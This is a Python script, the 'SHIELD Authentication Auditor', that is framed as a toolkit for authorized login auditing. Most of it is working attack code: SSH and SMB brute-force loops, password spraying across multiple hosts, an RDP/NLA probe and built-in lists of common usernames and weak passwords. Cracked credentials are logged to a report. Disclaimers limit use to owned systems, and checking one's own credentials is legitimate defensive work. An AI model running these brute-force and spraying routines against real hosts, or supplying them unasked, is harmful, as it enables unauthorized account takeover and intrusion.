#!/usr/bin/env python3
"""
SHIELD Authentication Auditor
SSH/RDP/SMB Login Testing Toolkit
For authorized security testing only on YOUR OWN systems!
"""

import socket
import subprocess
import sys
import os
import json
import time
import threading
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

# Force UTF-8
if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# Try to import paramiko for SSH
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False
    print("  [!] paramiko not installed - SSH testing disabled")
    print("      Install with: pip install paramiko")


class AuthAuditor:
    """Authentication Security Auditor"""
    
    def __init__(self):
        self.results = []
        self.shield_endpoint = "http://localhost:8002/ingest/syslog"
        self.stop_on_success = True
        self.delay = 1.0  # Delay between attempts (seconds)
        
        # Common username/password lists
        self.common_usernames = [
            "admin", "administrator", "root", "user", "test",
            "guest", "operator", "support", "backup", "service",
            "oracle", "postgres", "mysql", "ftp", "www",
        ]
        
        self.common_passwords = [
            "admin", "password", "123456", "root", "toor",
            "admin123", "password123", "12345678", "letmein",
            "changeme", "welcome", "monkey", "dragon", "master",
            "qwerty", "login", "abc123", "test", "guest",
            "administrator", "pass", "pass123", "1234", "111111",
        ]
    
    def print_banner(self):
        print("""
+==============================================================+
|     SHIELD AUTHENTICATION AUDITOR v1.0                       |
|          SSH / RDP / SMB Login Testing                       |
|     For authorized security testing only!                    |
|     Only test systems you own or have permission to test!    |
+==============================================================+
        """)
    
    # ==================== SSH TESTING ====================
    
    def test_ssh_login(self, host: str, port: int, username: str, password: str, 
                       timeout: float = 5.0) -> Dict:
        """Test a single SSH login"""
        result = {
            "host": host,
            "port": port,
            "username": username,
            "password": password,
            "success": False,
            "error": None
        }
        
        if not PARAMIKO_AVAILABLE:
            result["error"] = "paramiko not installed"
            return result
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(
                host,
                port=port,
                username=username,
                password=password,
                timeout=timeout,
                allow_agent=False,
                look_for_keys=False
            )
            
            result["success"] = True
            client.close()
            
        except paramiko.AuthenticationException:
            result["error"] = "Authentication failed"
        except paramiko.SSHException as e:
            result["error"] = f"SSH error: {str(e)}"
        except socket.timeout:
            result["error"] = "Connection timeout"
        except socket.error as e:
            result["error"] = f"Socket error: {str(e)}"
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def ssh_brute_force(self, host: str, port: int = 22, 
                        usernames: List[str] = None, 
                        passwords: List[str] = None,
                        max_threads: int = 5) -> List[Dict]:
        """SSH brute force attack (for authorized testing only!)"""
        
        print(f"\n  [*] SSH Brute Force Attack")
        print(f"  [*] Target: {host}:{port}")
        print(f"  [*] WARNING: Only use on systems you own!")
        
        usernames = usernames or self.common_usernames[:5]
        passwords = passwords or self.common_passwords[:10]
        
        total_attempts = len(usernames) * len(passwords)
        print(f"  [*] Total attempts: {total_attempts}")
        
        results = []
        found_creds = []
        attempts = 0
        
        for username in usernames:
            if self.stop_on_success and found_creds:
                break
                
            for password in passwords:
                if self.stop_on_success and found_creds:
                    break
                
                attempts += 1
                print(f"    [{attempts}/{total_attempts}] Trying {username}:{password}...", end=' ')
                
                result = self.test_ssh_login(host, port, username, password)
                results.append(result)
                
                if result["success"]:
                    print(f"SUCCESS!")
                    found_creds.append(result)
                else:
                    print(f"Failed - {result['error']}")
                
                time.sleep(self.delay)
        
        print(f"\n  [+] Brute force complete: {len(found_creds)} valid credentials found")
        
        return results
    
    # ==================== SMB TESTING ====================
    
    def test_smb_login(self, host: str, username: str, password: str, 
                       domain: str = "") -> Dict:
        """Test SMB login using net use command"""
        result = {
            "host": host,
            "username": username,
            "password": "***",  # Don't log password
            "domain": domain,
            "success": False,
            "error": None
        }
        
        try:
            # Build credentials
            if domain:
                cred_user = f"{domain}\\{username}"
            else:
                cred_user = username
            
            # Try to connect to IPC$ share
            share = f"\\\\{host}\\IPC$"
            
            # First disconnect any existing connection
            subprocess.run(
                ['net', 'use', share, '/delete', '/y'],
                capture_output=True, timeout=10
            )
            
            # Try to connect
            cmd = ['net', 'use', share, f'/user:{cred_user}', password]
            proc = subprocess.run(
                cmd,
                capture_output=True, text=True, timeout=15,
                encoding='utf-8', errors='replace'
            )
            
            if proc.returncode == 0:
                result["success"] = True
                
                # Disconnect after successful test
                subprocess.run(
                    ['net', 'use', share, '/delete', '/y'],
                    capture_output=True, timeout=10
                )
            else:
                result["error"] = proc.stderr.strip() or "Authentication failed"
                
        except subprocess.TimeoutExpired:
            result["error"] = "Connection timeout"
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def smb_brute_force(self, host: str, 
                        usernames: List[str] = None,
                        passwords: List[str] = None,
                        domain: str = "") -> List[Dict]:
        """SMB brute force attack (for authorized testing only!)"""
        
        print(f"\n  [*] SMB Brute Force Attack")
        print(f"  [*] Target: {host}")
        print(f"  [*] WARNING: Only use on systems you own!")
        
        usernames = usernames or self.common_usernames[:5]
        passwords = passwords or self.common_passwords[:10]
        
        total_attempts = len(usernames) * len(passwords)
        print(f"  [*] Total attempts: {total_attempts}")
        
        results = []
        found_creds = []
        attempts = 0
        
        for username in usernames:
            if self.stop_on_success and found_creds:
                break
                
            for password in passwords:
                if self.stop_on_success and found_creds:
                    break
                
                attempts += 1
                print(f"    [{attempts}/{total_attempts}] Trying {username}...", end=' ')
                
                result = self.test_smb_login(host, username, password, domain)
                results.append(result)
                
                if result["success"]:
                    print(f"SUCCESS!")
                    found_creds.append(result)
                else:
                    print(f"Failed")
                
                time.sleep(self.delay)
        
        print(f"\n  [+] Brute force complete: {len(found_creds)} valid credentials found")
        
        return results
    
    # ==================== RDP TESTING ====================
    
    def check_rdp_open(self, host: str, port: int = 3389, timeout: float = 3.0) -> bool:
        """Check if RDP port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def check_rdp_nla(self, host: str, port: int = 3389) -> Dict:
        """Check RDP NLA status"""
        result = {
            "host": host,
            "port": port,
            "rdp_open": False,
            "nla_enabled": None
        }
        
        # Check if port is open
        result["rdp_open"] = self.check_rdp_open(host, port)
        
        if not result["rdp_open"]:
            return result
        
        # Try to detect NLA status (simplified check)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            # Send RDP negotiation request
            # This is a simplified check
            sock.send(b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
            
            response = sock.recv(1024)
            sock.close()
            
            # Check response for NLA indicators
            if len(response) > 15:
                # Byte 15 contains security protocol flags
                if response[15] & 0x03:
                    result["nla_enabled"] = True
                else:
                    result["nla_enabled"] = False
                    
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    # ==================== ANALYSIS ====================
    
    def password_spray(self, hosts: List[str], username: str, passwords: List[str],
                       service: str = "smb") -> List[Dict]:
        """Password spraying attack across multiple hosts"""
        
        print(f"\n  [*] Password Spray Attack")
        print(f"  [*] Targets: {len(hosts)} hosts")
        print(f"  [*] Username: {username}")
        print(f"  [*] Service: {service}")
        
        results = []
        
        for password in passwords:
            print(f"\n  [*] Trying password across all hosts...")
            
            for host in hosts:
                if service == "smb":
                    result = self.test_smb_login(host, username, password)
                elif service == "ssh":
                    result = self.test_ssh_login(host, 22, username, password)
                else:
                    continue
                
                results.append(result)
                
                if result["success"]:
                    print(f"    [+] {host}: SUCCESS!")
                else:
                    print(f"    [-] {host}: Failed")
            
            time.sleep(self.delay * 5)  # Longer delay between spray attempts
        
        return results
    
    def analyze_results(self, results: List[Dict]) -> Dict:
        """Analyze brute force results"""
        analysis = {
            "total_attempts": len(results),
            "successful": sum(1 for r in results if r.get("success")),
            "failed": sum(1 for r in results if not r.get("success")),
            "errors": {},
            "valid_credentials": []
        }
        
        for r in results:
            if r.get("success"):
                analysis["valid_credentials"].append({
                    "host": r.get("host"),
                    "username": r.get("username"),
                    "password": r.get("password") if r.get("password") != "***" else "REDACTED"
                })
            
            error = r.get("error")
            if error:
                analysis["errors"][error] = analysis["errors"].get(error, 0) + 1
        
        return analysis
    
    # ==================== REPORTING ====================
    
    def generate_report(self, results: List[Dict], filename: str = None) -> str:
        """Generate audit report"""
        if filename is None:
            filename = f"auth_audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        analysis = self.analyze_results(results)
        
        report = {
            "audit_time": datetime.now().isoformat(),
            "analysis": analysis,
            "results": results
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n  [+] Report saved: {filename}")
        return filename
    
    def send_to_shield(self, results: List[Dict]):
        """Send results to SHIELD dashboard"""
        import requests
        
        for r in results:
            if r.get("success"):
                try:
                    payload = {
                        "timestamp": time.time(),
                        "source_ip": "auth_auditor",
                        "destination_ip": r.get("host", "unknown"),
                        "event_type": "AUTH_AUDIT: Weak Credentials Found",
                        "severity": "CRITICAL",
                        "payload": {
                            "username": r.get("username"),
                            "service": "SSH" if r.get("port") == 22 else "SMB"
                        },
                        "tenant_id": "T-AUTH"
                    }
                    requests.post(self.shield_endpoint, json=payload, timeout=2)
                except Exception:
                    pass


def main():
    auditor = AuthAuditor()
    auditor.print_banner()
    
    print("\n  [!] IMPORTANT: Only test systems you own or have explicit permission to test!")
    print("  [!] Unauthorized access attempts are illegal.\n")
    
    # Demo: Check RDP on localhost
    print("\n  === RDP CHECK (localhost) ===")
    rdp_result = auditor.check_rdp_nla("127.0.0.1")
    print(f"    RDP Open: {rdp_result['rdp_open']}")
    if rdp_result['rdp_open']:
        print(f"    NLA Enabled: {rdp_result['nla_enabled']}")
    
    # Demo: Check SMB on localhost
    print("\n  === SMB CHECK (localhost) ===")
    smb_test = auditor.test_smb_login("127.0.0.1", "guest", "")
    print(f"    Guest access: {'Enabled' if smb_test['success'] else 'Disabled'}")
    
    # Note about SSH testing
    print("\n  === SSH TESTING ===")
    if PARAMIKO_AVAILABLE:
        print("    paramiko is available - SSH testing enabled")
        print("    To test: auditor.ssh_brute_force('target_ip')")
    else:
        print("    [!] Install paramiko for SSH testing: pip install paramiko")
    
    print("\n  [+] Demo complete!")
    print("  [*] To run actual tests, modify and execute this script with your targets.")


if __name__ == "__main__":
    main()
